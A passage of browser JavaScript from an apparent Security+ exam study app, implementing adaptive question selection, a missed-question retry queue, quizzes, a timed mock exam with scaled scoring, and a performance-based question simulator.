       secplus.missed.v1   = { "D4-071": 1, ... }      questions answered wrong
     The adaptive set weights selection toward weak/unseen objectives (and prior
     misses); the missed queue re-serves only wrong questions until you get them
     right. Helpers read window.APP directly so the dashboard can call them
     before any quiz entry point binds A.
     =========================================================================== */
  var QS = {
    getObj: function () { return window.APP.store.get("objstats.v1", {}) || {}; },
    getMissed: function () { return window.APP.store.get("missed.v1", {}) || {}; },
    /* fold a graded set into the persistent stores. items = prepared array
       (each has .ref and .answer); picks = chosen indices into shuffled opts. */
    record: function (items, picks) {
      var obj = this.getObj(), missed = this.getMissed();
      items.forEach(function (it, i) {
        var q = it.ref, ok = picks[i] === it.answer;
        var o = obj[q.obj] || { c: 0, n: 0 }; o.n++; if (ok) o.c++; obj[q.obj] = o;
        if (ok) delete missed[q.id]; else missed[q.id] = 1;
      });
      window.APP.store.set("objstats.v1", obj);
      window.APP.store.set("missed.v1", missed);
    },
    missedCount: function () { return Object.keys(this.getMissed()).length; },
    /* weakest domain by accumulated objective accuracy (>= 3 attempts) */
    weakestDomain: function () {
      var obj = this.getObj(), dom = {};
      for (var k in obj) { var d = k[0]; dom[d] = dom[d] || { c: 0, n: 0 }; dom[d].c += obj[k].c; dom[d].n += obj[k].n; }
      var worst = null, worstAcc = 2;
      for (var dd in dom) { if (dom[dd].n >= 3) { var a = dom[dd].c / dom[dd].n; if (a < worstAcc) { worstAcc = a; worst = dd; } } }
      return worst ? ("Domain " + worst) : null;
    }
  };

  /* per-question weight: weak/unseen objectives and prior misses score higher */
  function adaptiveWeight(q, obj, missed) {
    var o = obj[q.obj], w;
    if (!o || !o.n) w = 2.2;                 // unseen objective → encourage coverage
    else w = 1 + 2 * (1 - o.c / o.n);        // weak objective weighted up to 3x
    if (missed[q.id]) w += 1.5;              // a prior miss gets an extra boost
    return w;
  }
  /* weighted sampling without replacement */
  function weightedSample(pool, n, wf) {
    var items = pool.map(function (q) { return { q: q, w: Math.max(0.01, wf(q)) }; });
    var out = [];
    n = Math.min(n, items.length);
    for (var k = 0; k < n; k++) {
      var total = items.reduce(function (a, x) { return a + x.w; }, 0);
      var r = Math.random() * total, acc = 0, idx = 0;
      for (var i = 0; i < items.length; i++) { acc += items[i].w; if (r <= acc) { idx = i; break; } }
      out.push(items[idx].q); items.splice(idx, 1);
    }
    return out;
  }
  function adaptiveSet(n) {
    var obj = QS.getObj(), missed = QS.getMissed();
    return weightedSample(S.questions, n, function (q) { return adaptiveWeight(q, obj, missed); });
  }

  /* ===========================================================================
     LINEAR QUIZ  (domain quiz + quick quiz): immediate feedback per question
     =========================================================================== */
  function runLinearQuiz(opts) {
    ready();
    var items = opts.items.map(prepare);
    var idx = 0, picks = new Array(items.length).fill(null);

    A.open({
      tag: opts.tag,
      render: function (host) {
        var pane = el("div");
        host.appendChild(A.crumb(opts.title, { onBack: function () {
          A.confirm("Leave quiz?", "Your progress on this quiz will not be saved.", "Leave", function () { A.dashboard(); A.renderDashboard(); });
        } }));
        host.appendChild(el("div.phead", null, [el("h1", { text: opts.title }), el("span.sub", { text: opts.sub })]));
        host.appendChild(pane);
        draw(pane);
      }
    });

    function draw(pane) {
      pane.innerHTML = "";
      var wrap = el("div.quizwrap");
      var bar = el("div.qmeta", null, [
        el("div.progressbar", null, el("i", { style: "width:" + (idx / items.length * 100) + "%" })),
        el("div.qcount", { text: "Question " + (idx + 1) + " of " + items.length })
      ]);
      wrap.appendChild(bar);

      var it = items[idx], q = it.ref, answered = picks[idx] != null;
      var dc = "d" + q.domain;
      var qc = el("div.qcard-full");
      qc.appendChild(el("div.qhead", null, [
        el("span.qdombadge." + dc, { text: "DOMAIN " + q.domain }),
        el("span.qobj", { text: "Objective " + q.obj }),
        el("span.qobj", { text: "· " + (q.diff || "medium") })
      ]));
      qc.appendChild(el("div.qtext", { html: q.q }));

      it.opts.forEach(function (text, i) {
        var cls = "opt";
        if (answered) {
          if (i === it.answer) cls += " correct";
          else if (i === picks[idx]) cls += " wrong";
        }
        var b = el("button." + cls.replace(/ /g, "."), { type: "button", disabled: answered ? "disabled" : null });
        b.appendChild(el("span.key", { text: LETTERS[i] }));
        b.appendChild(el("span", { html: text }));
        if (answered && i === it.answer) b.appendChild(el("span.tick", { text: "✓" }));
        if (answered && i === picks[idx] && i !== it.answer) b.appendChild(el("span.tick", { text: "✗" }));
        if (!answered) b.addEventListener("click", function () { picks[idx] = i; draw(pane); });
        qc.appendChild(b);
      });

      if (answered) {
        var correct = picks[idx] === it.answer;
        qc.appendChild(el("div.rationale" + (correct ? "" : ".bad"), null, [
          el("span.lbl", { text: correct ? "Correct" : "Not quite" }),
          el("span", { html: q.explain })
        ]));
      }

      var nav = el("div.qnav", null, [
        el("button.btn.ghost", { text: "← Previous", disabled: idx === 0 ? "disabled" : null, onclick: function () { if (idx > 0) { idx--; draw(pane); } } }),
        answered
          ? el("button.btn.primary", { text: idx === items.length - 1 ? "See results →" : "Next question →", onclick: function () { if (idx === items.length - 1) finish(); else { idx++; draw(pane); } } })
          : el("span.note", { text: "Select an answer to continue." })
      ]);
      qc.appendChild(nav);
      wrap.appendChild(qc);
      pane.appendChild(wrap);
    }

    function finish() {
      var stats = blankStats(), correct = 0, wrongList = [];
      items.forEach(function (it, i) {
        var ok = picks[i] === it.answer;
        stats[it.ref.domain].total++; if (ok) { stats[it.ref.domain].correct++; correct++; }
        if (!ok) wrongList.push({ it: it, pick: picks[i] });
      });
      var pct = Math.round(correct / items.length * 100);
      QS.record(items, picks); // feed adaptive engine + missed-question queue
      A.store.record({ mode: opts.mode, modeLabel: opts.modeLabel, detail: opts.detail, pct: pct, correct: correct, total: items.length, domainStats: stats });
      showResults({
        tag: opts.tag, title: opts.title, mode: opts.mode,
        correct: correct, total: items.length, pct: pct, stats: stats, wrongList: wrongList,
        retry: function () { opts.retry(); }
      });
    }
  }

  /* ===========================================================================
     RESULTS DASHBOARD (shared by quizzes + mock)
     =========================================================================== */
  function showResults(r) {
    A.open({
      tag: "Results", render: function (host) {
        host.appendChild(A.crumb("Results", { onBack: function () { A.dashboard(); A.renderDashboard(); } }));
        host.appendChild(el("div.phead", null, [el("h1", { text: r.title + " — Results" })]));
        var box = el("div.results");

        var isMock = r.mode === "mock";
        var pass = isMock ? r.scaled >= ((S.exam && S.exam.passing) || 750) : r.pct >= 70;
        var ringcol = pass ? "var(--low)" : (r.pct >= 50 ? "var(--amber)" : "var(--crit)");
        var hero = el("div.scorehero");
        var ring = el("div.scorering", { style: "--pct:" + r.pct + ";--ringcol:" + ringcol });
        ring.appendChild(el("div.inner", null, [el("div.pct", { text: r.pct + "%" }), el("div.lab", { text: r.correct + "/" + r.total })]));
        hero.appendChild(ring);
        hero.appendChild(el("div.verdict." + (pass ? "pass" : "fail"), { text: pass ? (isMock ? "Likely Pass" : "Strong") : (isMock ? "Not Yet Passing" : "Keep Studying") }));
        if (isMock) hero.appendChild(el("div.scaled", { html: "Scaled score <b style='color:var(--ink)'>" + r.scaled + "</b> / 900 &nbsp;·&nbsp; passing is <b style='color:var(--ink)'>" + ((S.exam && S.exam.passing) || 750) + "</b>" }));
        else hero.appendChild(el("div.scaled", { text: r.correct + " of " + r.total + " correct" }));
        box.appendChild(hero);

        /* per-domain bars */
        box.appendChild(el("div.secthead", { text: "By domain" }));
        var bars = el("div.dombars");
        (S.domainMeta || []).forEach(function (d) {
          var st = r.stats[d.id]; if (!st || !st.total) return;
          var p = Math.round(st.correct / st.total * 100);
          bars.appendChild(el("div.dombar", null, [
            el("div.name", { text: "D" + d.id + " · " + d.title }),
            el("div.track", null, el("i", { style: "width:" + p + "%;background:var(--d" + d.id + ")" })),
            el("div.pct", { text: st.correct + "/" + st.total })
          ]));
        });
        box.appendChild(bars);

        /* review of missed items, mapped to objectives */
        box.appendChild(el("div.secthead", { text: r.wrongList.length ? "Review missed questions (" + r.wrongList.length + ")" : "Review" }));
        if (!r.wrongList.length) box.appendChild(el("div.empty", { text: "Perfect run — nothing to review. 🎯" }));
        var rl = el("div.reviewlist");
        r.wrongList.forEach(function (w) {
          var q = w.it.ref;
          var yourText = w.pick == null ? "(left blank)" : w.it.opts[w.pick];
          var corrText = w.it.opts[w.it.answer];
          rl.appendChild(el("div.ritem", null, [
            el("p.rq", { html: q.q }),
            el("div.ra", null, [el("span.you.bad", { html: "Your answer: " + A.esc(yourText) })]),
            el("div.ra", null, [el("span.corr", { html: "Correct: " + A.esc(corrText) })]),
            el("div.rationale", null, [el("span.lbl", { text: "Why" }), el("span", { html: q.explain })]),
            el("div.robj", { text: ((S.exam && S.exam.code) || "") + " Domain " + q.domain + " · Objective " + q.obj })
          ]));
        });
        box.appendChild(rl);

        box.appendChild(el("div.btnrow", { style: "margin-top:22px;justify-content:center" }, [
          el("button.btn.primary", { text: "Try another set", onclick: function () { r.retry(); } }),
          el("button.btn", { text: "View analytics", onclick: function () { A.openAnalytics(); } }),
          el("button.btn.ghost", { text: "Back to dashboard", onclick: function () { A.dashboard(); A.renderDashboard(); } })
        ]));
        host.appendChild(box);
      }
    });
  }

  /* ===========================================================================
     TIMED MOCK EXAM  (90 weighted questions, timer, flagging, palette)
     =========================================================================== */
  function buildMockSet() {
    var total = S.exam.maxQuestions, picks = [];
    var meta = S.domainMeta.slice();
    var alloc = meta.map(function (d) { return { d: d.id, n: Math.round(total * d.weight / 100) }; });
    var sum = alloc.reduce(function (a, x) { return a + x.n; }, 0);
    var biggest = 0; alloc.forEach(function (x, i) { if (S.domainMeta[i].weight > S.domainMeta[biggest].weight) biggest = i; }); alloc[biggest].n += (total - sum); // fold rounding drift into the highest-weight domain
    alloc.forEach(function (x) {
      var pool = byDomain(x.d);
      picks = picks.concat(sample(pool, Math.min(x.n, pool.length)));
    });
    return shuffle(picks).map(prepare);
  }

  function startMock() {
    ready();
    if (S.questions.length < S.exam.maxQuestions) { A.toast("Question bank still loading…"); return; }
    var items = buildMockSet();
    var picks = new Array(items.length).fill(null);
    var flags = new Array(items.length).fill(false);
    var idx = 0;
    var DURATION = S.exam.minutes * 60; // seconds
    var remaining = DURATION;
    var ticker = null, paneRef = null, ended = false;

    A.open({
      tag: "Mock exam", render: function (host) {
        host.appendChild(A.crumb("Mock exam in progress", { onBack: function () {
          A.confirm("Abandon the mock exam?", "You are mid-exam. Leaving discards this attempt and it will not be scored.", "Abandon exam", function () { stop(); A.dashboard(); A.renderDashboard(); });
        } }));
        host.appendChild(el("div.phead", null, [el("h1", { text: "Full-Length Mock Exam" }), el("span.sub", { text: S.exam.maxQuestions + " questions · weighted to " + ((S.exam && S.exam.code) || "") + " domains" })]));
        paneRef = el("div"); host.appendChild(paneRef);
        draw();
        ticker = setInterval(tick, 1000);
      }
    });

    function tick() {
      remaining--; updateTimer();
      if (remaining <= 0) { stop(); A.toast("Time! Submitting your exam."); submit(); }
    }
    function stop() { if (ticker) clearInterval(ticker); ticker = null; }
    function fmt(s) { var m = Math.floor(s / 60), ss = s % 60; return (m < 10 ? "0" : "") + m + ":" + (ss < 10 ? "0" : "") + ss; }
    function updateTimer() {
      var t = paneRef && paneRef.querySelector("#mockTimer"); if (!t) return;
      t.textContent = "⏱ " + fmt(remaining);
      t.className = "timer" + (remaining <= 60 ? " crit" : remaining <= 300 ? " warn" : "");
    }

    function draw() {
      if (ended) return;
      paneRef.innerHTML = "";
      var wrap = el("div.quizwrap");
      var answeredCount = picks.filter(function (p) { return p != null; }).length;

      var meta = el("div.qmeta", null, [
        el("div.timer#mockTimer", { text: "⏱ " + fmt(remaining) }),
        el("div.progressbar", null, el("i", { style: "width:" + (answeredCount / items.length * 100) + "%" })),
        el("div.qcount", { text: answeredCount + " / " + items.length + " answered" })
      ]);
      wrap.appendChild(meta);
      updateTimer();

      /* palette */
      var pal = el("div.palette");
      items.forEach(function (_, i) {
        var c = "palette";
        var b = el("button", { text: String(i + 1), onclick: function () { idx = i; draw(); } });
        if (picks[i] != null) b.classList.add("answered");
        if (flags[i]) b.classList.add("flagged");
        if (i === idx) b.classList.add("current");
        pal.appendChild(b);
      });
      wrap.appendChild(pal);

      var it = items[idx], q = it.ref;
      var qc = el("div.qcard-full");
      qc.appendChild(el("div.qhead", null, [
        el("span.qdombadge.d" + q.domain, { text: "DOMAIN " + q.domain }),
        el("span.qobj", { text: "Question " + (idx + 1) + " of " + items.length }),
        el("button.qflag" + (flags[idx] ? ".on" : ""), { text: flags[idx] ? "Flagged" : "Flag for review", onclick: function () { flags[idx] = !flags[idx]; draw(); } })
      ]));
      qc.appendChild(el("div.qtext", { html: q.q }));
      it.opts.forEach(function (text, i) {
        var b = el("button.opt" + (picks[idx] === i ? ".sel" : ""), { type: "button" });
        b.appendChild(el("span.key", { text: LETTERS[i] }));
        b.appendChild(el("span", { html: text }));
        b.addEventListener("click", function () { picks[idx] = (picks[idx] === i ? null : i); draw(); });
        qc.appendChild(b);
      });

      var nav = el("div.qnav", null, [
        el("button.btn.ghost", { text: "← Previous", disabled: idx === 0 ? "disabled" : null, onclick: function () { if (idx > 0) { idx--; draw(); } } }),
        el("div.btnrow", null, [
          idx === items.length - 1
            ? el("button.btn.primary", { text: "Review & submit", onclick: reviewSubmit })
            : el("button.btn.primary", { text: "Next →", onclick: function () { idx++; draw(); } })
        ])
      ]);
      qc.appendChild(nav);
      wrap.appendChild(qc);
      paneRef.appendChild(wrap);
    }

    function reviewSubmit() {
      var unanswered = picks.filter(function (p) { return p == null; }).length;
      var flagged = flags.filter(Boolean).length;
      A.confirm("Submit exam?",
        (unanswered ? unanswered + " question(s) are unanswered and will be marked wrong. " : "All questions answered. ") +
        (flagged ? flagged + " are flagged for review. " : "") + "Submit for scoring?",
        "Submit exam", function () { stop(); submit(); });
    }

    function submit() {
      if (ended) return; ended = true; stop();
      var stats = blankStats(), correct = 0, wrongList = [];
      items.forEach(function (it, i) {
        var ok = picks[i] === it.answer;
        stats[it.ref.domain].total++; if (ok) { stats[it.ref.domain].correct++; correct++; }
        if (!ok) wrongList.push({ it: it, pick: picks[i] });
      });
      var pct = Math.round(correct / items.length * 100);
      var scaled = Math.max(100, Math.min(900, Math.round(100 + pct / 100 * 800)));
      QS.record(items, picks); // feed adaptive engine + missed-question queue
      A.store.record({ mode: "mock", modeLabel: "Mock exam", detail: correct + "/" + items.length + " · used " + Math.round((DURATION - remaining) / 60) + " min", pct: pct, scaled: scaled, correct: correct, total: items.length, domainStats: stats });
      showResults({ tag: "Results", title: "Mock Exam", mode: "mock", correct: correct, total: items.length, pct: pct, scaled: scaled, stats: stats, wrongList: wrongList, retry: startMock });
    }
  }

  /* ===========================================================================
     PBQ SIMULATOR  (exhibit + dropdown fields, graded with rationale)
     =========================================================================== */
  function openPBQFormat(fid) {
    ready();
    var fmt = (S.pbqFormats || []).filter(function (f) { return f.id === fid; })[0] || {};
    var list = S.pbqs.filter(function (p) { return p.format === fid; });
    var done = A.store.get("pbqDone", []) || [];

    A.open({
      tag: "PBQ · " + (fmt.badge || ("Format " + fid)), render: function (host) {
        host.appendChild(A.crumb(fmt.title));
        host.appendChild(el("div.phead", null, [el("h1", { text: fmt.title }), el("span.sub", { text: (fmt.badge || ("Format " + fid)) + " · " + list.length + " simulations · objective " + fmt.obj })]));
        host.appendChild(el("p.sectsub", { html: fmt.long || fmt.desc }));
        var grid = el("div.grid");
        list.forEach(function (p, i) {
          var isDone = done.indexOf(p.id) >= 0;
          grid.appendChild((function () {
            var c = el("button.card" + (isDone ? ".domain.d" + p.domain : ""), { type: "button", onclick: function () { runPBQ(list, i, fid); } });
            c.appendChild(el("div.kome", null, [
              el("span.ico", { text: fmt.icon }),
              el("span.tag.d" + p.domain, { text: isDone ? "✓ DONE" : "PBQ " + (i + 1) })
            ]));
            c.appendChild(el("h3", { text: p.title }));
            c.appendChild(el("div.desc", { html: (p.brief || "").slice(0, 120) + ((p.brief || "").length > 120 ? "…" : "") }));
            c.appendChild(el("div.foot", null, [el("span", { text: p.fields.length + " decisions · D" + p.domain }), el("span.go", { text: "Open →" })]));
            return c;
          })());
        });
        host.appendChild(grid);
        if (A.backBar) host.appendChild(A.backBar());
      }
    });
  }

  function runPBQ(list, i, fid) {
    var p = list[i];
    var fmt = (S.pbqFormats || []).filter(function (f) { return f.id === fid; })[0] || {};
    var graded = false;
    var selects = [];

    A.open({
      tag: "PBQ " + p.id, render: function (host) {
        host.appendChild(A.crumb(p.id, { onBack: function () { openPBQFormat(fid); } }));
        host.appendChild(el("div.phead", null, [el("h1", { text: p.title }), el("span.sub", { text: "Domain " + p.domain + " · " + fmt.title })]));
        var wrap = el("div.pbqwrap");
        wrap.appendChild(el("p.pbq-brief", { html: p.brief }));

        if (p.exhibit) {
          wrap.appendChild(el("div.terminal", null, [
            el("div.tbar", null, [el("span.dots", null, [el("i"), el("i"), el("i")]), el("span.ttl", { text: p.exhibitTitle || "exhibit" })]),
            el("pre", { html: p.exhibit })
          ]));
        }

        var fieldsHost = el("div.pbq-fields");
        p.fields.forEach(function (f, fi) {
          var fld = el("div.field");
          fld.appendChild(el("div.flabel", { text: (fi + 1) + ". " + f.label }));
          if (f.hint) fld.appendChild(el("div.fhint", { html: f.hint }));
          var sel = el("select");
          sel.appendChild(el("option", { value: "", text: "— choose —" }));
          f.options.forEach(function (o, oi) { sel.appendChild(el("option", { value: String(oi), text: o })); });
          fld.appendChild(sel);
          fld.appendChild(el("div.fexplain", { html: "<span class='ans'>Correct: " + A.esc(f.options[f.answer]) + ".</span> " + f.explain }));
          fieldsHost.appendChild(fld);
          selects.push({ sel: sel, fld: fld, f: f });
        });
        wrap.appendChild(fieldsHost);

        var summary = el("div", { style: "margin-top:8px" });
        var actions = el("div.qnav", null, [
          el("button.btn.ghost", { text: "← All " + fmt.title.split(" ")[0] + " PBQs", onclick: function () { openPBQFormat(fid); } }),
          el("div.btnrow", null, [
            el("button.btn.primary#pbqGrade", { text: "Submit & grade", onclick: grade }),
            i < list.length - 1 ? el("button.btn", { text: "Next PBQ →", onclick: function () { runPBQ(list, i + 1, fid); } }) : null
          ])
        ]);
        wrap.appendChild(summary);
        wrap.appendChild(actions);
        host.appendChild(wrap);

        function grade() {
          if (graded) { // already graded → act as reset
            selects.forEach(function (s) { s.sel.value = ""; s.sel.disabled = false; s.fld.classList.remove("graded", "correct", "wrong"); });
            graded = false; summary.innerHTML = ""; $set("Submit & grade"); return;
          }
          var miss = selects.some(function (s) { return s.sel.value === ""; });
          if (miss && !confirmProceed()) return;
          var correct = 0;
          selects.forEach(function (s) {
            var val = s.sel.value === "" ? -1 : parseInt(s.sel.value, 10);
            var ok = val === s.f.answer;
            if (ok) correct++;
            s.fld.classList.add("graded"); s.fld.classList.toggle("correct", ok); s.fld.classList.toggle("wrong", !ok);
            s.sel.disabled = true;
          });
          graded = true; $set("Reset");
          var pct = Math.round(correct / selects.length * 100);
          var pass = pct >= 70;
          summary.innerHTML = "";
          summary.appendChild(el("div.rationale" + (pass ? "" : ".bad"), null, [
            el("span.lbl", { text: pass ? "Well configured" : "Needs work" }),
            el("span", { html: "<b>" + correct + " of " + selects.length + "</b> decisions correct (" + pct + "%). " + (p.summary || "") })
          ]));
          /* mark complete */
          var done = A.store.get("pbqDone", []) || [];
          if (done.indexOf(p.id) < 0) { done.push(p.id); A.store.set("pbqDone", done); }
          A.store.record({ mode: "pbq", modeLabel: "PBQ", detail: p.id + " · " + fmt.title.split(" ")[0], pct: pct, correct: correct, total: selects.length, domainStats: (function () { var st = blankStats(); st[p.domain] = { correct: correct, total: selects.length }; return st; })() });
          summary.scrollIntoView({ behavior: "smooth", block: "nearest" });
        }
        function $set(t) { var b = host.querySelector("#pbqGrade"); if (b) b.textContent = t; }
        var proceeded = false;
        function confirmProceed() { return window.confirm("Some fields are unset and will be marked incorrect. Grade anyway?"); }
      }
    });
  }

  /* ===========================================================================
     PUBLIC ENGINE SURFACE
     =========================================================================== */
  window.QUIZ = {
    startDomainQuiz: function (d) {
      ready();
      var meta = A.domainMeta(d);
      var pool = byDomain(d);
      if (pool.length < 1) { A.toast("No questions for this domain yet."); return; }
      runLinearQuiz({
        tag: "D" + d + " Quiz", mode: "domain", modeLabel: "Domain quiz",
        title: "Domain " + d + " Quiz", sub: meta.title + " · 10 questions",
        detail: "Domain " + d, items: sample(pool, Math.min(10, pool.length)),
        retry: function () { window.QUIZ.startDomainQuiz(d); }
      });
    },
    startQuickQuiz: function () {
      runLinearQuiz({
        tag: "Quick Quiz", mode: "quick", modeLabel: "Quick quiz",
        title: "Randomized Quick Quiz", sub: "10 questions · all five domains",
        detail: "Mixed", items: sample(S.questions, 10),
        retry: function () { window.QUIZ.startQuickQuiz(); }
      });
    },
    /* Adaptive: 10 questions weighted toward your weakest objectives + prior misses. */
    startAdaptive: function () {
      ready();
      var items = adaptiveSet(10);
      if (!items.length) { A.toast("No questions available."); return; }
      var weak = QS.weakestDomain();
      runLinearQuiz({
        tag: "Adaptive", mode: "adaptive", modeLabel: "Adaptive practice",
        title: "Adaptive Practice",
        sub: "10 questions weighted to your weak areas" + (weak ? " · focus: " + weak : ""),
        detail: weak ? "Weighted · " + weak : "Adaptive", items: items,
        retry: function () { window.QUIZ.startAdaptive(); }
      });
    },
    /* Missed queue: re-serve only previously-wrong questions (answering one
       correctly removes it from the queue via QS.record). */
    startMissed: function () {
      ready();
      var missed = QS.getMissed();
      var pool = S.questions.filter(function (q) { return missed[q.id]; });
      if (!pool.length) { A.toast("No missed questions yet — take a quiz first."); return; }
      runLinearQuiz({
        tag: "Missed", mode: "missed", modeLabel: "Missed questions",
        title: "Missed Questions", sub: pool.length + " in your retry queue",
        detail: "Retry", items: sample(pool, Math.min(15, pool.length)),
        retry: function () { window.QUIZ.startMissed(); }
      });
    },
    missedCount: function () { return QS.missedCount(); },
    weakestDomain: function () { return QS.weakestDomain(); },
    startMock: startMock,
    openPBQFormat: openPBQFormat
  };
})();
